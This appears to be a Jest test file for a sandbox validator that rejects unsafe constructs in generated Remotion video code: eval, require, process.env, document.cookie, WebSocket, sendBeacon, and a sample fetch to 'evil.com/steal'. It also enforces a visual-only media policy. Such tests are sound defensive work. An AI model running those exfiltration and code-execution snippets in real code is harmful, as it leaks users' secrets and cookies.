import { validateCode, sanitizeCode } from '@/lib/remotion/sandbox';

describe('validateCode', () => {
  it('allows clean Remotion component code', () => {
    const code = `
      const { useCurrentFrame, AbsoluteFill } = remotion;
      const PARAMS = { color: '#fff' };
      const Component = () => <AbsoluteFill style={{ backgroundColor: PARAMS.color }} />;
    `;
    expect(validateCode(code)).toEqual({ valid: true, errors: [] });
  });

  it('blocks eval usage', () => {
    const code = `eval('malicious code')`;
    expect(validateCode(code).valid).toBe(false);
    expect(validateCode(code).errors).toContain('Forbidden: eval');
  });

  it('blocks fetch usage', () => {
    const code = `fetch('https://evil.com/steal')`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks process access', () => {
    const code = `process.env.SECRET`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks document.cookie access', () => {
    const code = `document.cookie`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks dynamic import', () => {
    const code = `import('malicious')`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks require', () => {
    const code = `require('fs')`;
    expect(validateCode(code).valid).toBe(false);
  });

  // TM-34 — extended deny list
  it('blocks new Function', () => {
    expect(validateCode(`const f = new Function('return 1');`).valid).toBe(false);
  });

  it('blocks setTimeout-with-string', () => {
    expect(validateCode(`setTimeout("alert(1)", 0);`).valid).toBe(false);
  });

  it('blocks WebSocket', () => {
    expect(validateCode(`const ws = new WebSocket('wss://e.com');`).valid).toBe(false);
  });

  it('blocks navigator.sendBeacon', () => {
    expect(validateCode(`navigator.sendBeacon('/x', d);`).valid).toBe(false);
  });

  it('blocks indexedDB', () => {
    expect(validateCode(`indexedDB.open('x');`).valid).toBe(false);
  });

  it('blocks __proto__ assignment', () => {
    expect(validateCode(`obj.__proto__ = bad;`).valid).toBe(false);
  });

  it('blocks __defineGetter__', () => {
    expect(validateCode(`o.__defineGetter__('x', f);`).valid).toBe(false);
  });

  it('blocks with statement', () => {
    expect(validateCode(`with (obj) { x = 1; }`).valid).toBe(false);
  });

  it('blocks Worker spawn', () => {
    expect(validateCode(`new Worker('w.js')`).valid).toBe(false);
    expect(validateCode(`new SharedWorker('w.js')`).valid).toBe(false);
  });

  it('blocks location.assign', () => {
    expect(validateCode(`location.assign('/evil');`).valid).toBe(false);
  });

  it('blocks EventSource', () => {
    expect(validateCode(`new EventSource('/sse');`).valid).toBe(false);
  });

  it('does not double-report the same forbidden token', () => {
    const code = `eval('1'); eval('2'); eval('3');`;
    const errors = validateCode(code).errors;
    expect(errors.filter(e => e === 'Forbidden: eval')).toHaveLength(1);
  });

  // TM-123 — visual-only policy. Audio/Video/OffthreadVideo/IFrame are
  // rejected because generated assets have no source-of-truth for `src`.
  describe('TM-123 visual-only media policy', () => {
    it('blocks <Audio src={number}> (the exact user-blocking case)', () => {
      const code = `
        const PARAMS = { volume: 0 };
        const C = () => <Audio src={PARAMS.volume} />;
      `;
      const result = validateCode(code);
      expect(result.valid).toBe(false);
      expect(result.errors.some(e => e.includes('Audio'))).toBe(true);
    });

    it('blocks <Audio src="..."> even with a string src', () => {
      const code = `const C = () => <Audio src="https://example.com/x.mp3" />;`;
      expect(validateCode(code).valid).toBe(false);
    });

    it('blocks <Video src={...}>', () => {
      const code = `const C = () => <Video src={PARAMS.url} />;`;
      expect(validateCode(code).valid).toBe(false);
      expect(validateCode(code).errors.some(e => e.includes('Video'))).toBe(true);
    });

    it('blocks <OffthreadVideo>', () => {
      const code = `const C = () => <OffthreadVideo src="x" />;`;
      expect(validateCode(code).valid).toBe(false);
    });

    it('blocks <IFrame>', () => {
      const code = `const C = () => <IFrame src="x" />;`;
      expect(validateCode(code).valid).toBe(false);
    });

    it('blocks <Audio  /> with extra whitespace', () => {
      const code = `const C = () => < Audio  src="x" />;`;
      expect(validateCode(code).valid).toBe(false);
    });

    it('does NOT flag identifiers that merely contain "Audio" as a substring', () => {
      // Defensive: bare word matches should require a JSX-open prefix (`<`).
      const code = `
        const PARAMS = { showAudioBars: true };
        const audioVisualizer = 1;
        const C = () => <AbsoluteFill>{audioVisualizer}</AbsoluteFill>;
      `;
      const result = validateCode(code);
      // Audio-substring identifiers should NOT trigger the media deny rule.
      expect(result.errors.find(e => e.includes('TM-123'))).toBeUndefined();
    });

    it('does NOT flag <AudioBars> or other components that just start with "Audio"', () => {
      const code = `
        const AudioBars = () => <AbsoluteFill />;
        const C = () => <AudioBars />;
      `;
      const result = validateCode(code);
      expect(result.errors.find(e => e?.includes('TM-123'))).toBeUndefined();
    });
  });
});

describe('sanitizeCode', () => {
  it('removes remotion import statements', () => {
    const code = `import { useCurrentFrame } from 'remotion';\nconst frame = useCurrentFrame();`;
    const result = sanitizeCode(code);
    expect(result).not.toContain("from 'remotion'");
    expect(result).toContain('const frame = useCurrentFrame()');
  });

  it('removes react import statements', () => {
    const code = `import React from 'react';\nconst x = 1;`;
    const result = sanitizeCode(code);
    expect(result).not.toContain("from 'react'");
  });
});
